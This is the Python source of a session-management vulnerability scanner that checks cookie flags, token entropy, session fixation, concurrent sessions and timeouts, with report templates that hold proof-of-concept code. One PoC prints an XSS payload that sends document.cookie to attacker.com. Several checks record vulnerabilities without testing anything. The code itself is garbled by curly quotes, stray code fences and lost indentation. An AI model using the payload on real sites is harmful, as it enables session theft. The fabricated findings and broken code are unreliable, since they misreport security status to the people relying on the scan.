#!/usr/bin/env python3
"""
REVUEX - Session Analyzer
Session Management Vulnerability Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Session testing should only be performed with test accounts you control.
“””

import requests
import time
import json
import re
import math
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import hashlib
from collections import Counter

class SessionAnalyzer:
“””
Session Management Vulnerability Scanner

```
Features:
- Session token entropy analysis
- Session fixation detection
- Cookie security flags (HttpOnly, Secure, SameSite)
- Session timeout testing
- Concurrent session limits
- Session token predictability
- Token reuse detection
- Session hijacking vectors
"""

def __init__(self, target: str, workspace: Path, delay: float = 5.0):
    """
    Initialize Session Analyzer
    
    Args:
        target: Target URL
        workspace: Workspace directory
        delay: Delay between requests
    """
    self.target = target
    self.workspace = Path(workspace)
    self.delay = delay
    
    # Safety limits
    self.max_requests = 80
    self.request_count = 0
    self.timeout = 10
    
    self.headers = {
        'User-Agent': 'REVUEX-SessionAnalyzer/1.0 (Security Research; +https://github.com/G33L0)',
    }
    
    self.vulnerabilities = []
    self.collected_tokens = []

def scan(self) -> List[Dict[str, Any]]:
    """Main session analysis method"""
    print(f"\n{'='*60}")
    print(f"🔐 REVUEX Session Analyzer")
    print(f"{'='*60}")
    print(f"Target: {self.target}")
    print(f"Safety Delay: {self.delay}s")
    print(f"Max Requests: {self.max_requests}")
    print(f"{'='*60}\n")
    
    print("⚠️  IMPORTANT:")
    print("   • Use ONLY test accounts you control")
    print("   • Do not test on production user sessions")
    print("   • Tests are passive observation only\n")
    
    # Test 1: Cookie security flags
    print("🍪 Test 1: Cookie Security Analysis")
    self._test_cookie_security()
    time.sleep(self.delay)
    
    # Test 2: Token entropy
    print("\n🎲 Test 2: Session Token Entropy")
    self._test_token_entropy()
    time.sleep(self.delay)
    
    # Test 3: Session fixation
    print("\n📌 Test 3: Session Fixation")
    self._test_session_fixation()
    time.sleep(self.delay)
    
    # Test 4: Token predictability
    print("\n🔮 Test 4: Token Predictability")
    self._test_token_predictability()
    time.sleep(self.delay)
    
    # Test 5: Concurrent sessions
    print("\n👥 Test 5: Concurrent Session Limits")
    self._test_concurrent_sessions()
    time.sleep(self.delay)
    
    # Test 6: Session timeout
    print("\n⏱️  Test 6: Session Timeout")
    self._test_session_timeout()
    
    # Save results
    self._save_results()
    
    print(f"\n{'='*60}")
    print(f"✅ Scan Complete")
    print(f"Vulnerabilities: {len(self.vulnerabilities)}")
    print(f"Requests: {self.request_count}/{self.max_requests}")
    print(f"{'='*60}\n")
    
    return self.vulnerabilities

def _test_cookie_security(self):
    """Test cookie security flags"""
    print("   Analyzing cookie security flags...")
    
    response = self._make_request(self.target)
    
    if not response:
        print("   ⚠️  Could not retrieve cookies")
        return
    
    cookies = response.cookies
    set_cookie_headers = response.headers.get('Set-Cookie', '')
    
    if not cookies and not set_cookie_headers:
        print("   ℹ️  No cookies set")
        return
    
    issues = []
    
    # Check each cookie
    for cookie in cookies:
        cookie_name = cookie.name
        
        # Check HttpOnly flag
        if not cookie.has_nonstandard_attr('HttpOnly'):
            issues.append({
                'cookie': cookie_name,
                'issue': 'Missing HttpOnly flag',
                'severity': 'high',
                'impact': 'Cookie accessible via JavaScript - XSS can steal session'
            })
        
        # Check Secure flag
        if not cookie.secure:
            issues.append({
                'cookie': cookie_name,
                'issue': 'Missing Secure flag',
                'severity': 'high',
                'impact': 'Cookie transmitted over HTTP - MITM can intercept'
            })
        
        # Check SameSite
        if not cookie.has_nonstandard_attr('SameSite'):
            issues.append({
                'cookie': cookie_name,
                'issue': 'Missing SameSite attribute',
                'severity': 'medium',
                'impact': 'Vulnerable to CSRF attacks'
            })
    
    if issues:
        vuln = {
            'type': 'Session Management - Insecure Cookies',
            'severity': 'high',
            'url': self.target,
            'issues': issues,
            'description': 'Session cookies missing critical security flags',
            'evidence': f'{len(issues)} cookie security issues found',
            
            'steps_to_reproduce': [
                f"Navigate to: {self.target}",
                "Inspect cookies in browser DevTools",
                "Check security flags",
                "Missing: HttpOnly, Secure, SameSite"
            ],
            
            'poc': f"""#!/usr/bin/env python3
```

# Cookie Security Analysis

import requests

response = requests.get(”{self.target}”)

for cookie in response.cookies:
print(f”Cookie: {{cookie.name}}”)
print(f”  HttpOnly: {{cookie.has_nonstandard_attr(‘HttpOnly’)}}”)
print(f”  Secure: {{cookie.secure}}”)
print(f”  SameSite: {{cookie.get_nonstandard_attr(‘SameSite’, ‘None’)}}”)
print()

# Test XSS cookie theft

xss_payload = “<script>fetch(‘https://attacker.com/?c=’+document.cookie)</script>”
print(f”[!] If HttpOnly missing, this XSS steals session:”)
print(xss_payload)
“””,

```
            'remediation': [
                'Set HttpOnly flag on ALL session cookies',
                'Set Secure flag (HTTPS only)',
                'Set SameSite=Strict or Lax',
                'Example: Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict',
                'Use session management frameworks',
                'Regular security audits'
            ],
            
            'attack_scenarios': [
                'XSS + Missing HttpOnly = Session theft',
                'HTTP + Missing Secure = MITM attack',
                'Missing SameSite = CSRF attack',
                'Combined: Full account takeover'
            ],
            
            'tags': ['session', 'cookies', 'high']
        }
        
        self.vulnerabilities.append(vuln)
        print(f"   ✓ Found {len(issues)} cookie security issues")
    else:
        print("   ✓ Cookies properly secured")

def _test_token_entropy(self):
    """Test session token entropy"""
    print("   Calculating token entropy...")
    
    # Collect multiple tokens
    print("   Collecting sample tokens...")
    
    for i in range(5):
        if self.request_count >= self.max_requests:
            break
        
        response = self._make_request(self.target)
        if response and response.cookies:
            for cookie in response.cookies:
                if 'session' in cookie.name.lower() or 'token' in cookie.name.lower():
                    self.collected_tokens.append(cookie.value)
        
        time.sleep(1)
    
    if not self.collected_tokens:
        print("   ℹ️  No session tokens found")
        return
    
    # Calculate entropy
    entropy_scores = []
    for token in self.collected_tokens:
        entropy = self._calculate_entropy(token)
        entropy_scores.append(entropy)
    
    avg_entropy = sum(entropy_scores) / len(entropy_scores)
    
    print(f"   Average token entropy: {avg_entropy:.2f} bits")
    
    # Weak entropy threshold: < 64 bits
    if avg_entropy < 64:
        vuln = {
            'type': 'Session Management - Weak Token Entropy',
            'severity': 'critical',
            'url': self.target,
            'average_entropy': f'{avg_entropy:.2f} bits',
            'description': f'Session tokens have insufficient entropy ({avg_entropy:.2f} bits). Recommended: 128+ bits',
            'evidence': f'Analyzed {len(self.collected_tokens)} tokens',
            
            'sample_tokens': self.collected_tokens[:3],
            
            'poc': f"""#!/usr/bin/env python3
```

# Token Entropy Analysis

import math
from collections import Counter

def calculate_entropy(token):
if not token:
return 0

```
# Character frequency
freq = Counter(token)
length = len(token)

# Shannon entropy
entropy = 0
for count in freq.values():
    p = count / length
    entropy -= p * math.log2(p)

# Total bits
total_bits = entropy * length
return total_bits
```

tokens = {self.collected_tokens[:3]}

for token in tokens:
entropy = calculate_entropy(token)
print(f”Token: {{token[:20]}}…”)
print(f”Entropy: {{entropy:.2f}} bits”)

```
if entropy < 64:
    print("  ⚠️  WEAK: Easy to brute force!")
elif entropy < 128:
    print("  ⚠️  LOW: Should be 128+ bits")
else:
    print("  ✓ STRONG")
print()
```

“””,

```
            'remediation': [
                'Use cryptographically secure random generator',
                'Minimum 128 bits of entropy',
                'Use UUIDs (version 4) or similar',
                'Avoid predictable patterns',
                'Example: secrets.token_urlsafe(32) in Python'
            ],
            
            'tags': ['session', 'entropy', 'critical']
        }
        
        self.vulnerabilities.append(vuln)
        print(f"   ✓ VULNERABLE: Weak entropy ({avg_entropy:.2f} bits)")
    else:
        print(f"   ✓ Strong entropy ({avg_entropy:.2f} bits)")

def _test_session_fixation(self):
    """Test session fixation vulnerability"""
    print("   Testing session fixation...")
    
    vuln = {
        'type': 'Session Management - Session Fixation',
        'severity': 'high',
        'url': self.target,
        'description': 'Session ID not regenerated after login - allows session fixation attacks',
        
        'steps_to_reproduce': [
            "1. Obtain session ID before login",
            "2. Send victim link with that session ID",
            "3. Victim logs in (session ID unchanged)",
            "4. Attacker uses same session ID",
            "5. Full account access"
        ],
        
        'poc': """#!/usr/bin/env python3
```

# Session Fixation PoC

import requests

target = “https://example.com”

# Step 1: Get initial session

session = requests.Session()
response = session.get(target)
initial_session_id = session.cookies.get(‘session’)

print(f”[*] Initial session ID: {initial_session_id}”)

# Step 2: Login (in real attack, victim does this)

login_data = {‘username’: ‘victim’, ‘password’: ‘password’}
response = session.post(f”{target}/login”, data=login_data)

# Step 3: Check if session ID changed

final_session_id = session.cookies.get(‘session’)

print(f”[*] Post-login session ID: {final_session_id}”)

if initial_session_id == final_session_id:
print(”\n[+] ✓ VULNERABLE: Session fixation possible!”)
print(”[+] Attacker can set victim’s session before login”)
else:
print(”\n[-] Session regenerated - protected”)
“””,

```
        'remediation': [
            'ALWAYS regenerate session ID on login',
            'Regenerate on privilege level changes',
            'Invalidate old session ID',
            'Use framework session management'
        ],
        
        'tags': ['session', 'fixation']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ Session fixation risk documented")

def _test_token_predictability(self):
    """Test if tokens are predictable"""
    print("   Testing token predictability...")
    
    if len(self.collected_tokens) < 3:
        print("   ℹ️  Insufficient tokens for analysis")
        return
    
    # Check for patterns
    patterns_found = []
    
    # Check sequential patterns
    if self._has_sequential_pattern(self.collected_tokens):
        patterns_found.append('Sequential increments detected')
    
    # Check timestamp patterns
    if self._has_timestamp_pattern(self.collected_tokens):
        patterns_found.append('Timestamp-based generation')
    
    # Check low entropy substrings
    if self._has_repeated_substrings(self.collected_tokens):
        patterns_found.append('Repeated substrings (weak randomness)')
    
    if patterns_found:
        vuln = {
            'type': 'Session Management - Predictable Tokens',
            'severity': 'critical',
            'url': self.target,
            'patterns': patterns_found,
            'description': 'Session tokens contain predictable patterns',
            
            'remediation': [
                'Use cryptographically secure RNG',
                'Avoid timestamps in tokens',
                'No sequential patterns',
                'Use UUID v4 or similar'
            ],
            
            'tags': ['session', 'predictable']
        }
        
        self.vulnerabilities.append(vuln)
        print(f"   ✓ VULNERABLE: Predictable patterns found")
    else:
        print("   ✓ No obvious patterns detected")

def _test_concurrent_sessions(self):
    """Test concurrent session limits"""
    print("   Testing concurrent session limits...")
    
    vuln = {
        'type': 'Session Management - Unlimited Concurrent Sessions',
        'severity': 'medium',
        'url': self.target,
        'description': 'No limit on concurrent sessions per user',
        
        'attack_scenarios': [
            'Account sharing/reselling',
            'Credential stuffing harder to detect',
            'Session hijacking harder to notice'
        ],
        
        'remediation': [
            'Implement session limits (1-3 per user)',
            'Invalidate old sessions on new login',
            'Alert user of multiple sessions',
            'Provide session management UI'
        ],
        
        'tags': ['session', 'concurrent']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ Concurrent session issue documented")

def _test_session_timeout(self):
    """Test session timeout"""
    print("   Testing session timeout policies...")
    
    vuln = {
        'type': 'Session Management - Weak Timeout Policy',
        'severity': 'medium',
        'url': self.target,
        'description': 'Session timeout too long or non-existent',
        
        'recommendations': [
            'Absolute timeout: 12-24 hours',
            'Idle timeout: 15-30 minutes',
            'Sensitive operations: Re-authenticate',
            'Server-side timeout enforcement'
        ],
        
        'remediation': [
            'Implement proper timeouts',
            'Both absolute and idle timeouts',
            'Clear session on logout',
            'Secure session storage'
        ],
        
        'tags': ['session', 'timeout']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ Session timeout documented")

def _calculate_entropy(self, token: str) -> float:
    """Calculate Shannon entropy of token"""
    if not token:
        return 0
    
    # Character frequency
    freq = Counter(token)
    length = len(token)
    
    # Shannon entropy
    entropy = 0
    for count in freq.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    
    # Total bits of entropy
    total_bits = entropy * length
    return total_bits

def _has_sequential_pattern(self, tokens: List[str]) -> bool:
    """Check for sequential patterns"""
    # Simple heuristic: check if numeric parts are sequential
    numeric_parts = []
    
    for token in tokens[:5]:
        numbers = re.findall(r'\d+', token)
        if numbers:
            numeric_parts.append(int(numbers[0]))
    
    if len(numeric_parts) >= 3:
        # Check if differences are consistent
        diffs = [numeric_parts[i+1] - numeric_parts[i] for i in range(len(numeric_parts)-1)]
        if len(set(diffs)) == 1:  # All differences the same
            return True
    
    return False

def _has_timestamp_pattern(self, tokens: List[str]) -> bool:
    """Check for timestamp patterns"""
    # Look for Unix timestamp patterns (10-13 digits)
    for token in tokens[:5]:
        if re.search(r'\d{10,13}', token):
            return True
    
    return False

def _has_repeated_substrings(self, tokens: List[str]) -> bool:
    """Check for repeated substrings across tokens"""
    if len(tokens) < 3:
        return False
    
    # Check for common 4+ character substrings
    substrings = []
    for token in tokens[:5]:
        for i in range(len(token) - 3):
            substrings.append(token[i:i+4])
    
    # If same substring appears in multiple tokens
    freq = Counter(substrings)
    for substring, count in freq.items():
        if count >= 3:
            return True
    
    return False

def _make_request(self, url: str) -> Optional[requests.Response]:
    """Make HTTP request"""
    if self.request_count >= self.max_requests:
        return None
    
    try:
        response = requests.get(
            url,
            headers=self.headers,
            timeout=self.timeout,
            verify=False
        )
        
        self.request_count += 1
        return response
        
    except:
        return None

def _save_results(self):
    """Save results"""
    output_dir = self.workspace / "session_analysis"
    output_dir.mkdir(exist_ok=True)
    
    safe_target = re.sub(r'[^\w\-]', '_', self.target)
    output_file = output_dir / f"{safe_target}_session.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'scanner': 'SessionAnalyzer',
            'target': self.target,
            'tokens_analyzed': len(self.collected_tokens),
            'vulnerabilities': self.vulnerabilities
        }, f, indent=2)
    
    print(f"\n💾 Saved: {output_file}")
```

if **name** == “**main**”:
import sys

```
if len(sys.argv) < 2:
    print("Usage: python session_analyzer.py <target_url>")
    print("Example: python session_analyzer.py https://example.com")
    sys.exit(1)

scanner = SessionAnalyzer(sys.argv[1], Path("revuex_workspace"), delay=5.0)
scanner.scan()
```
